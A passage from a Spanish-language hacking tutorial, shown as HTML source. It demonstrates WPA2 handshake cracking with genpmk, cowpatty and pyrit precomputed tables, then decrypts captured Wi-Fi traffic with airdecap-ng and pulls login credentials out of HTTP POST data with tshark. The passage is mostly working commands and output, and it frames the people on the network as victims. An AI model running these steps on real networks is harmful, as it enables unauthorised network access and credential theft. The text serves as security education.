      EAPOL HMAC     : 64 A2 4A 1B D6 22 93 78 78 09 2F 42 7E 11 8F BC 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Valores clave:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;204.456 contraseñas por segundo&lt;/li&gt;
  &lt;li&gt;0.X segundos hasta dar con la contraseña&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Lo sé, flipante, pero es que se puede ir aún más rápido.&lt;/p&gt;

&lt;h4 id=&quot;rainbow-table-con-genpmk&quot;&gt;Rainbow Table con Genpmk&lt;/h4&gt;

&lt;p&gt;Hemos visto cómo podemos aumentar considerablemente la velocidad de cómputo haciendo uso de la suite de
&lt;strong&gt;aircrack&lt;/strong&gt;. Ahora distanciémonos un poco de &lt;strong&gt;aircrack&lt;/strong&gt; y pensemos en &lt;strong&gt;Cowpatty&lt;/strong&gt; y &lt;strong&gt;Pyrit&lt;/strong&gt;, no nos
sorprendió mucho la última vez, ¿verdad?, sin embargo, vamos a hacer que tomen un papel más importante.&lt;/p&gt;

&lt;p&gt;El fichero &lt;strong&gt;passwords-airolib&lt;/strong&gt; no puede ser aprovechado por &lt;strong&gt;Cowpatty&lt;/strong&gt; ni por &lt;strong&gt;Pyrit&lt;/strong&gt;, en este caso
tendremos que hacer uso de &lt;strong&gt;genpmk&lt;/strong&gt; para generar un nuevo diccionario de claves precomputadas adaptado para
que sea interpretado por estas fantásticas herramientas.&lt;/p&gt;

&lt;p&gt;La sintaxis es la siguiente:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[✗]─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#genpmk -f diccionario -d dic.genpmk -s hacklab&lt;/span&gt;
genpmk 1.3 - WPA-PSK precomputation attack. &amp;lt;jwright@hasborg.com&amp;gt;
File dic.genpmk does not exist, creating.
key no. 1000: skittles1
key no. 2000: princess15
key no. 3000: unfaithful
key no. 4000: andresteamo
key no. 5000: hennessy
key no. 6000: amigasporsiempre
key no. 7000: 0123654789
key no. 8000: trinitron
key no. 9000: flower22
key no. 10000: vincenzo
key no. 11000: pensacola
key no. 12000: boyracer
key no. 13000: grandmom
key no. 14000: battlefield
key no. 15000: badangel
key no. 16000: liferocks
key no. 17000: forever15
key no. 18000: gabriell
key no. 19000: mexico18
key no. 20000: 13031991
key no. 21000: kitty1234
key no. 22000: casper22
key no. 23000: 12021989
key no. 24000: tigers15

24078 passphrases tested &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;39.35 seconds:  611.90 passphrases/second
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Esto lo que ha hecho ha sido generarnos un nuevo diccionario &lt;strong&gt;dic.genpmk&lt;/strong&gt; de claves precomputadas. Llegados
a este punto, podemos hacer lo que se describe en los siguientes puntos.&lt;/p&gt;

&lt;h4 id=&quot;cracking-con-cowpatty-frente-a-rainbow-table&quot;&gt;Cracking con Cowpatty frente a Rainbow Table&lt;/h4&gt;

&lt;p&gt;Aprovechando el diccionario &lt;strong&gt;dic.genpmk&lt;/strong&gt; generado con &lt;strong&gt;genpmk&lt;/strong&gt;, hacemos lo siguiente:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[✗]─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#cowpatty -d dic.genpmk -r Captura-01.cap -s hacklab&lt;/span&gt;
cowpatty 4.8 - WPA-PSK dictionary attack. &amp;lt;jwright@hasborg.com&amp;gt;

Collected all necessary data to mount crack against WPA2/PSK passphrase.
Starting dictionary attack.  Please be patient.
key no. 10000: vincenzo

The PSK is &lt;span class=&quot;s2&quot;&gt;&quot;hottie4u&quot;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;

15242 passphrases tested &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;0.04 seconds:  361013.75 passphrases/second
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Puntos clave:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;361.013 contraseñas por segundo&lt;/li&gt;
  &lt;li&gt;0.04 segundos en dar la contraseña&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;¿Intentamos ir algo más rápido?&lt;/p&gt;

&lt;h4 id=&quot;cracking-con-pyrit-frente-a-rainbow-table&quot;&gt;Cracking con Pyrit frente a Rainbow Table&lt;/h4&gt;

&lt;p&gt;Aprovechando una vez más el mismo diccionario &lt;strong&gt;dic.genpmk&lt;/strong&gt; generado con &lt;strong&gt;genpmk&lt;/strong&gt;, hacemos lo siguiente:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#pyrit -i dic.genpmk -e hacklab -r Captura-01.cap attack_cowpatty&lt;/span&gt;
Pyrit 0.5.1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;C&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2008-2011 Lukas Lueg - 2015 John Mora
https://github.com/JPaulMora/Pyrit
This code is distributed under the GNU General Public License v3+

Parsing file &lt;span class=&quot;s1&quot;&gt;'Captura-01.cap'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1/1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;...
Parsed 43 packets &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;43 802.11-packets&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, got 1 AP&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Picked AccessPoint 20:34:fb:b1:c5:53 automatically...
Tried 24078 PMKs so far&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 1992708 PMKs per second.

The password is &lt;span class=&quot;s1&quot;&gt;'hottie4u'&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Puntos clave:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;1.992.708 contraseñas por segundo&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Ya en este punto se podría decir que trabajando a unas casi 2 millones de contraseñas por segundo, estaríamos
más que contentos, ¿verdad?, pero es que se puede ir aún más rápido todavía.&lt;/p&gt;

&lt;h4 id=&quot;cracking-con-pyrit-a-través-de-ataque-por-base-de-datos&quot;&gt;Cracking con Pyrit a través de ataque por Base de Datos&lt;/h4&gt;

&lt;p&gt;Este es ya el considerado como el método más potente. Comenzamos importando todas las contraseñas de nuestro
diccionario desde &lt;strong&gt;Pyrit&lt;/strong&gt;:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#pyrit -i diccionario import_passwords&lt;/span&gt;
Pyrit 0.5.1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;C&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2008-2011 Lukas Lueg - 2015 John Mora
https://github.com/JPaulMora/Pyrit
This code is distributed under the GNU General Public License v3+

Connecting to storage at &lt;span class=&quot;s1&quot;&gt;'file://'&lt;/span&gt;...  connected.
70000 lines read. Flushing buffers.... 
All &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez hecho, especificamos el &lt;strong&gt;ESSID&lt;/strong&gt; con el que vamos a trabajar:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#pyrit -e hacklab create_essid&lt;/span&gt;
Pyrit 0.5.1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;C&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2008-2011 Lukas Lueg - 2015 John Mora
https://github.com/JPaulMora/Pyrit
This code is distributed under the GNU General Public License v3+

Connecting to storage at &lt;span class=&quot;s1&quot;&gt;'file://'&lt;/span&gt;...  connected.
ESSID already created
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Por último, generamos las claves precomputadas:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#pyrit batch&lt;/span&gt;
Pyrit 0.5.1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;C&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2008-2011 Lukas Lueg - 2015 John Mora
https://github.com/JPaulMora/Pyrit
This code is distributed under the GNU General Public License v3+

Connecting to storage at &lt;span class=&quot;s1&quot;&gt;'file://'&lt;/span&gt;...  connected.
Batchprocessing &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Iniciamos el ataque en modo ataque de base de datos con &lt;strong&gt;Pyrit&lt;/strong&gt;:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#pyrit -r Captura-01.cap attack_db&lt;/span&gt;
Pyrit 0.5.1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;C&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2008-2011 Lukas Lueg - 2015 John Mora
https://github.com/JPaulMora/Pyrit
This code is distributed under the GNU General Public License v3+

Connecting to storage at &lt;span class=&quot;s1&quot;&gt;'file://'&lt;/span&gt;...  connected.
Parsing file &lt;span class=&quot;s1&quot;&gt;'Captura-01.cap'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1/1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;...
Parsed 43 packets &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;43 802.11-packets&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, got 1 AP&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Picked AccessPoint 20:34:fb:b1:c5:53 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'hacklab'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; automatically.
Attacking handshake with Station 34:41:5d:46:d1:38...
Tried 37326 PMKs so far &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;100.0%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 18289321 PMKs per second.

The password is &lt;span class=&quot;s1&quot;&gt;'hottie4u'&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Y fijaros que velocidad más vertiginosa:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;18.289.321 contraseñas por segundo&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;técnicas-de-espionaje&quot;&gt;Técnicas de Espionaje&lt;/h3&gt;

&lt;p&gt;Este punto engloba algunas técnicas básicas &lt;strong&gt;sin entrar en fase de Pentesting&lt;/strong&gt; para a nivel de red ser capaces
de saber qué es lo que están haciendo nuestras víctimas, incluido el robo de datos para ciertos casos.&lt;/p&gt;

&lt;h4 id=&quot;uso-de-airdecap-para-el-desencriptado-de-paquetes&quot;&gt;Uso de Airdecap para el desencriptado de paquetes&lt;/h4&gt;

&lt;p&gt;Hasta ahora hemos visto cómo obtener las credenciales de acceso a una red inalámbrica. Ahora bien, ¿qué pasa
una vez estamos dentro?&lt;/p&gt;

&lt;p&gt;Está claro que podríamos iniciar con una fase de Pentesting para tratar de vulnerar la seguridad de los
sistemas y comenzar a comprometer todos los equipos, pero no es la idea. Partiremos a nivel de red, viendo
hasta qué punto podemos llegar con la información que hemos recopilado.&lt;/p&gt;

&lt;p&gt;Si nos fijamos, las capturas de monitorizado activo que exportamos con ‘airodump-ng’ viajan encriptadas, es
decir, no es posible visualizar consultas HTTP ni peticiones a nivel privado de red:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#tshark -r Captura-01.cap -Y &quot;http.request.method==POST&quot; 2&amp;gt;/dev/null&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Sin resultados&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;¿Por qué?, porque todo lo que estamos capturando es el tráfico externo que recopilamos en modo monitor:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#tshark -r Captura-01.cap 2&amp;gt;/dev/null | head -n 10 &lt;/span&gt;
    1   0.000000 AskeyCom_d4:16:78 → Broadcast    802.11 268 Beacon frame, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2233, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........, &lt;span class=&quot;nv&quot;&gt;BI&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;100, &lt;span class=&quot;nv&quot;&gt;SSID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;MOVISTAR_1677
    2   2.150527 AskeyCom_d4:16:78 → XiaomiCo_b1:c5:53 802.11 341 Probe Response, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2255, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........, &lt;span class=&quot;nv&quot;&gt;BI&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;100, &lt;span class=&quot;nv&quot;&gt;SSID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;MOVISTAR_1677
    3   2.150557              → AskeyCom_d4:16:78 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1c:b0:44:d4:16:78&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 802.11 10 Acknowledgement, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........
    4   2.165375 AskeyCom_d4:16:78 → XiaomiCo_b1:c5:53 802.11 341 Probe Response, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2256, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........, &lt;span class=&quot;nv&quot;&gt;BI&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;100, &lt;span class=&quot;nv&quot;&gt;SSID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;MOVISTAR_1677
    5   2.165405              → AskeyCom_d4:16:78 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1c:b0:44:d4:16:78&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 802.11 10 Acknowledgement, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........
    6   2.635968 XiaomiCo_b1:c5:53 → Broadcast    802.11 94 Data, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2262, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;.p....F.
    7   2.941632 XiaomiCo_b1:c5:53 → Broadcast    802.11 94 Data, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2266, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;.p....F.
    8   6.679016 IntelCor_46:d1:38 → AskeyCom_d4:16:77 802.11 110 QoS Data, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1512, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;.p.....T
    9   6.678975              → IntelCor_46:d1:38 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;34:41:5d:46:d1:38&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 802.11 10 Acknowledgement, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........
   10   6.681029 AskeyCom_d4:16:78 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1c:b0:44:d4:16:78&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;TA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; → IntelCor_46:d1:38 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;34:41:5d:46:d1:38&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 802.11 16 Request-to-send, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;No podemos ver desde aquí ningún tipo de consulta HTTP o tráfico interno.&lt;/p&gt;

&lt;p&gt;Entonces bien, ¿qué hacemos?, vamos a usar la cabeza por unos momentos. ¿Qué es lo que hace que los paquetes
que capturemos estén encriptados y no podamos ver el tráfico privado?, la propia contraseña de la red, ¿no?,
¿y qué pasa si la tenemos?, ¿no se supone que deberíamos ser capaces entonces de desencriptar estos paquetes?,
correcto.&lt;/p&gt;

&lt;p&gt;A través de la herramienta &lt;strong&gt;airdecap-ng&lt;/strong&gt; de la suite de &lt;strong&gt;aircrack&lt;/strong&gt;, es posible desencriptar estas capturas
siempre y cuando se proporcione la contraseña de la red correcta.&lt;/p&gt;

&lt;p&gt;Lo hacemos de la siguiente manera:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[✗]─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#ls&lt;/span&gt;
Captura-01.cap
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#airdecap-ng -e MOVISTAR_1677 -p XXXXXXXXXXXXXXXXXXXX Captura-01.cap &lt;/span&gt;
Total number of stations seen            9
Total number of packets &lt;span class=&quot;nb&quot;&gt;read          &lt;/span&gt;2838
Total number of WEP data packets         0
Total number of WPA data packets      1082
Number of plaintext data packets         0
Number of decrypted WEP  packets         0
Number of corrupted WEP  packets         0
Number of decrypted WPA  packets       189
Number of bad TKIP &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;WPA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; packets         0
Number of bad CCMP &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;WPA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; packets         0
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Si nos fijamos, se han desencriptado un total de 189 paquetes WPA. Esto es así debido a que la contraseña
proporcionada es la correcta, si hubiera puesto una que no fuera correcta no se habría desencriptado nada.&lt;/p&gt;

&lt;p&gt;Esto nos genera en el directorio actual de trabajo un nuevo fichero:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#ls&lt;/span&gt;
Captura-01.cap  Captura-01-dec.cap
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Sobre el cual podremos hacer los filtrados para visualizar el tráfico interno.&lt;/p&gt;

&lt;h4 id=&quot;análisis-del-desencriptado-con-tshark-y-wireshark&quot;&gt;Análisis del desencriptado con Tshark y Wireshark&lt;/h4&gt;

&lt;p&gt;Realmente usaré &lt;strong&gt;Tshark&lt;/strong&gt;, pero desde &lt;strong&gt;Wireshark&lt;/strong&gt; obtendríamos los mismos resultados. Intentemos ver ahora
si somos capaces de visualizar tráfico HTTP, concretamente, alguna petición POST que se haya realizado:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#tshark -r Captura-01-dec.cap -Y &quot;http.request.method==POST&quot; 2&amp;gt;/dev/null&lt;/span&gt;
  185  10.456181 192.168.1.55 → 46.231.127.84 HTTP 736 POST /includes/posthandler.php HTTP/1.1  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;application/x-www-form-urlencoded&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Interesante, vemos algo. Intentemos ver si somos capaces de visualizar el payload de esta petición:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#tshark -r Captura-01-dec.cap -Y &quot;http.request.method==POST&quot; -Tfields -e tcp.payload 2&amp;gt;/dev/null&lt;/span&gt;
50:4f:53:54:20:2f:69:6e:63:6c:75:64:65:73:2f:70:6f:73:74:68:61:6e:64:6c:65:72:2e:70:68:70:20:48:54:54:50:2f:31:2e:31:0d:0a:48:6f:73:74:3a:20:77:77:77:2e:61:6c:63:61:6e:7a:61:74:75:6d:65:74:61:2e:65:73:0d:0a:43:6f:6e:6e:65:63:74:69:6f:6e:3a:20:6b:65:65:70:2d:61:6c:69:76:65:0d:0a:43:6f:6e:74:65:6e:74:2d:4c:65:6e:67:74:68:3a:20:31:30:35:0d:0a:41:63:63:65:70:74:3a:20:2a:2f:2a:0d:0a:58:2d:52:65:71:75:65:73:74:65:64:2d:57:69:74:68:3a:20:58:4d:4c:48:74:74:70:52:65:71:75:65:73:74:0d:0a:55:73:65:72:2d:41:67:65:6e:74:3a:20:4d:6f:7a:69:6c:6c:61:2f:35:2e:30:20:28:58:31:31:3b:20:4c:69:6e:75:78:20:78:38:36:5f:36:34:29:20:41:70:70:6c:65:57:65:62:4b:69:74:2f:35:33:37:2e:33:36:20:28:4b:48:54:4d:4c:2c:20:6c:69:6b:65:20:47:65:63:6b:6f:29:20:43:68:72:6f:6d:65:2f:37:36:2e:30:2e:33:38:30:39:2e:38:37:20:53:61:66:61:72:69:2f:35:33:37:2e:33:36:0d:0a:43:6f:6e:74:65:6e:74:2d:54:79:70:65:3a:20:61:70:70:6c:69:63:61:74:69:6f:6e:2f:78:2d:77:77:77:2d:66:6f:72:6d:2d:75:72:6c:65:6e:63:6f:64:65:64:3b:20:63:68:61:72:73:65:74:3d:55:54:46:2d:38:0d:0a:4f:72:69:67:69:6e:3a:20:68:74:74:70:3a:2f:2f:77:77:77:2e:61:6c:63:61:6e:7a:61:74:75:6d:65:74:61:2e:65:73:0d:0a:52:65:66:65:72:65:72:3a:20:68:74:74:70:3a:2f:2f:77:77:77:2e:61:6c:63:61:6e:7a:61:74:75:6d:65:74:61:2e:65:73:2f:6c:6f:67:69:6e:2e:70:68:70:0d:0a:41:63:63:65:70:74:2d:45:6e:63:6f:64:69:6e:67:3a:20:67:7a:69:70:2c:20:64:65:66:6c:61:74:65:0d:0a:41:63:63:65:70:74:2d:4c:61:6e:67:75:61:67:65:3a:20:65:73:2d:45:53:2c:65:73:3b:71:3d:30:2e:39:2c:65:6e:3b:71:3d:30:2e:38:2c:6a:61:3b:71:3d:30:2e:37:0d:0a:43:6f:6f:6b:69:65:3a:20:50:48:50:53:45:53:53:49:44:3d:65:32:64:36:30:65:65:37:63:37:63:65:34:32:64:34:65:39:37:31:37:30:33:65:37:62:38:38:35:34:36:34:0d:0a:0d:0a:75:73:65:72:6e:61:6d:65:3d:73:34:76:69:74:61:72:26:70:61:73:73:77:6f:72:64:3d:6d:69:50:61:73:73:77:6f:72:64:49:6d:70:6f:73:69:62:6c:65:64:65:4f:62:74:65:6e:65:72:26:74:6f:6b:65:6e:3d:66:34:35:65:36:32:30:61:62:33:64:34:63:62:30:30:61:35:34:33:66:37:33:37:37:64:34:30:61:63:63:65:26:6c:6f:67:69:6e:3d:4c:6f:67:69:6e
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;¡Perfecto!, está en hexadecimal, pasémoslo a un formato algo más legible y veamos si podemos sacar algún dato
en claro:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#tshark -r Captura-01-dec.cap -Y &quot;http.request.method==POST&quot; -Tfields -e tcp.payload 2&amp;gt;/dev/null | xxd -ps -r; echo&lt;/span&gt;
POST /includes/posthandler.php HTTP/1.1
Host: www.alcanzatumeta.es
Connection: keep-alive
Content-Length: 105
Accept: &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
